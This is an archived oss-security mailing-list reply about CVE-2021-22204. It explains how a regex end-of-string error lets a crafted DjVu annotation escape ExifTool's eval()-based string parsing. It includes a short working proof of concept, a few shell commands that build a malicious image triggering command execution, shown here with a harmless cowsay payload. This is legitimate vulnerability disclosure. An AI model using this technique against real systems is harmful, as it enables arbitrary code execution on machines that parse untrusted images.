X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1199" "Monday" "10" "May" "2021" "15:46:18" "+0200" "Jakub Wilk" "jwilk@jwilk.net" nil "34" "Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image" nil nil nil "5" nil nil (number mark "U       jwilk@jwilk. May 10   34/1199  " thread-indent "\"Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code execution in the DjVu module when parsing a malicious image" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5281 invoked by uid 550); 10 May 2021 13:46:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5260 invoked from network); 10 May 2021 13:46:32 -0000
Authentication-Results: garm.ovh; auth=pass (GARM-96R001433af0f7-8a92-48c6-89fa-cc5151d7a393,
                    D6A8F79C329AAF9FAD043F409567DACFC528325F) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp: 5.173.65.66
Date: Mon, 10 May 2021 15:46:18 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: <oss-security@lists.openwall.com>
Message-ID: <20210510134618.dcarjcit5ftpomdm@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <CAPWJUnz=mf9+zHrrxgBYYZdQzDW-zKf0kCOeVY4y-61CeA9HPg@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed
Content-Disposition: inline
In-Reply-To: <CAPWJUnz=mf9+zHrrxgBYYZdQzDW-zKf0kCOeVY4y-61CeA9HPg@mail.gmail.com>
User-Agent: NeoMutt/20180716
X-Originating-IP: [37.59.142.96]
X-ClientProxiedBy: DAG6EX2.mxp6.local (172.16.2.52) To DAG4EX2.mxp6.local
 (172.16.2.32)
X-Ovh-Tracer-GUID: 9b3db0b2-0a89-4d54-93c8-7d64d78c3821
X-Ovh-Tracer-Id: 4119667763250976535
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeduledrvdegkedgieelucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecuhedttdenucenucfjughrpeffhffvuffkfhggtggujggfihesthdtredttdervdenucfhrhhomheplfgrkhhusgcuhghilhhkuceojhifihhlkhesjhifihhlkhdrnhgvtheqnecuggftrfgrthhtvghrnhephfefvdefheevhfekledtjeegleetfedvfedvuddvfefgudeuiedtieetvddthefgnecukfhppedtrddtrddtrddtpdefjedrheelrddugedvrdelieenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhhouggvpehsmhhtphdqohhuthdphhgvlhhopehmgihplhgrnheirdhmrghilhdrohhvhhdrnhgvthdpihhnvghtpedtrddtrddtrddtpdhmrghilhhfrhhomhepjhifihhlkhesjhifihhlkhdrnhgvthdprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhm
Subject: Re: [oss-security] [CVE-2021-22204] ExifTool - Arbitrary code
 execution in the DjVu module when parsing a malicious image

* William Bowling <will@wbowling.info>, 2021-05-09, 14:32:
>ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for 
>arbitrary code execution when parsing malicious images.

Using eval() to parse C-like strings is undoubtedly a terrible idea, but 
the code does attempt to neutralize the input, and it wasn't immediately 
obvious to me where the bug is. It turns out the way it determines where 
the string ends is incorrect:

    # we're good unless quote was escaped by odd number of backslashes
    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;

But $ doesn't match only the end of the string; it matches also before 
the trailing newline. You need \z if you want only the former. (But of 
course in this case ditching eval(), rather than fine-tuning the regex, 
was the right course of action.)

Proof of concept:

   $ printf 'P1 1 1 0' > moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned>&2);#"' >> moo.djvu
   $ exiftool moo.djvu > /dev/null
    _______
   < pwned >
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
